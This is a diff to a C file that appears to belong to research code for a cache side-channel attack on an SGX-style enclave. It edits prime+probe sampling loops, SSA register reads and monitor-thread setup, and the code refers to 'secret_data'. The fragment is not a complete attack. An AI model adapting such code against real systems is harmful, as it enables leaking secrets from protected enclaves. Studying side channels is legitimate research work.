@@ -39,16 +39,17 @@
 #include <stdio.h> /* vsnprintf */
 #include <string.h>
 
+#define ATTACK 0
+#define REPS 120
+
 #define DEBUG 0
 #define DEBUG_CACHE 0
-#define REPS 30
 #define OFFSET 27
 #define TIME_FLUSH 300
 #define MARGIN 180
 #define INTERLEAVED 1
 #define FULL_SET 0
 #define LINE_OFF 8
-#define ATTACK 0
 #define CONTINUOS 0
 
 typedef uint64_t sys_word_t;
@@ -1465,16 +1466,17 @@ void collect_samples_attack(long int address)
         prime_ev_set(address);
         prime_ev_set(address);
         mfence();
-        while (i< (REPS*200)*(MONITORED_SETS * SAMPLES_SIZE * CACHE_SET_SIZE * CACHE_SLICES))
+        //while (i< (REPS*200)*(MONITORED_SETS * SAMPLES_SIZE * CACHE_SET_SIZE * CACHE_SLICES))
+        while (1)
         {
 	    access_timed(begin, &s[0]);
 	    begin = (long int *)(*begin);
-	    if ((i % MON_WINDOW) == 0)
-            {
-                get_rip();
-                lfence();
-	        get_eax();
- 	    }
+	    // if ((i % MON_WINDOW) == 0)
+        //     {
+        //         get_rip();
+        //         lfence();
+	    //     get_eax();
+ 	    // }
             i++;
         }
     }
@@ -1624,7 +1626,6 @@ void printf_helloworld()
     regs = (size_t *)(thread_data->first_ssa_gpr);
     stack = (char *)(thread_data->first_ssa_gpr);
     regs[20] = 0;
-    timeini = 0;
 
     // Ensure the counter is running
     if (!(check_running()))
@@ -1641,7 +1642,7 @@ void printf_helloworld()
         pthread_mutex_unlock(&mutex_start);
         pthread_create(&monitor_task, NULL, monitor_sets_old, NULL);
     }
-    increase_counter();
+    //increase_counter();
     long int examp = global_counter;
     if (DEBUG){
         printf("Hello World %i \n", (int8_t)secret_data[0]);
@@ -1651,9 +1652,30 @@ void printf_helloworld()
 
 void printfile_measurements(int *ways)
 {
+    // Ensure the counter is running and if not get everything ready
+    mon_ways = WAYS_FILLED;
+    //Info about the thread reading SSA
+    thread_data = get_thread_data();
+    regs = (size_t *)(thread_data->first_ssa_gpr);
+    stack = (char *)(thread_data->first_ssa_gpr);
+    regs[20] = 0;
+
     // Ensure the counter is running
-    //if (!(check_running()))
-    //    pthread_create(&counter_task, NULL, fast_counter, NULL);
+    if (!(check_running()))
+        pthread_create(&counter_task, NULL, fast_counter, NULL);
+    //Assign the secret
+    if (!(check_ready()))
+    {
+        gen_plot(30);
+        pthread_mutex_lock(&mutex_start);
+        while (!(check_ready()))
+        {
+            pthread_cond_wait(&condp, &mutex_start);
+        }
+        pthread_mutex_unlock(&mutex_start);
+        pthread_create(&monitor_task, NULL, monitor_sets_old, NULL);
+    }
+
     int inter = (*(ways));
     if ((inter > CACHE_SET_SIZE) || (inter < 3))
     {
